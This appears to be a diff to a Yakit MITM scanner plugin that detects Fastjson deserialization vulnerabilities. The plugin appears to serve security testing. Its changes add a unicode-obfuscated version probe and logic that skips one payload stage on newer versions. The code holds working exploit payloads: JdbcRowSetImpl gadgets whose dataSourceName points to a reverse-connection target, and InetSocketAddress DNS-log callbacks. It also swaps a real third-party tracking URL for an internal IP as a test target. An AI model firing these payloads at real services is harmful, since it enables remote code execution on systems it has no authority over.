@@ -2,7 +2,7 @@
 
 #--------------------------WORKSPACE-----------------------------
 __test__ = func() {
-    results, err := yakit.GenerateYakitMITMHooksParams("POST", "https://pluto.didapinche.com/web/tracking")
+    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://192.168.101.177:8084/")
     if err != nil {
         
         return
@@ -15,7 +15,7 @@ highVersionPayload = [`{"{{randstr(2)}}":{"@type":"org.apache.ibatis.datasource.
 dnslogPayloads = [`{"{{randstr(2)}}":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"java.net.Inet4Address","val":"{{params(reverseConnTarget)}}"}}`]
 nextPayload = [`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr(2)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseConnTarget)}}","autoCommit":true}}`,`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,,,{,,,"dataSourceName":"{{params(reverseConnTarget)}}", "autoCommit":true}`]
 
-
+checkFastjsonVerion = `{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0041\u0075\u0074\u006f\u0043\u006c\u006f\u0073\u0065\u0061\u0062\u006c\u0065"`
 fastJsonCount = 0
 lock = sync.NewLock()
 addTask = func() {
@@ -77,6 +77,24 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
         yakit_output(sprintf("build http request failed: %s", err))
         return
     }
+    yakit_output(sprintf("try to analysis fastjson version"))
+
+    freqResult ,err = freq.FuzzPostRaw(checkFastjsonVerion /*type: ...string*/).ExecFirst(httpool.https(isHttps))
+
+
+    version = re.Grok(string(freqResult.ResponseRaw), `fastjson-version %{COMMONVERSION:version}`)["version"]
+
+    if version != undefined {
+        yakit_output(sprintf("%v FastJson Version! %v", addr, version))
+
+        data = str.Split(version, "."/*type: string*/)[2]
+
+        if data != undefined {
+            if parseInt(data) > 43 {
+                bypassNextPayload = true
+            }
+        }
+    }
     domain=""
     token = ""
     payloadRes = []
@@ -124,10 +142,12 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
         for _,dnslogPayload = range dnslogPayloads{
             if testPayload(dnslogPayload,true){
                 riskLevel = "middle"
-                for _,payloadRaw = range nextPayload{
-                    if testPayload(payloadRaw,false){
-                        riskLevel = "critical"
-                        return true
+                if !bypassNextPayload {  
+                    for _,payloadRaw = range nextPayload{
+                        if testPayload(payloadRaw,false){
+                            riskLevel = "critical"
+                            return true
+                        }
                     }
                 }
                 return true
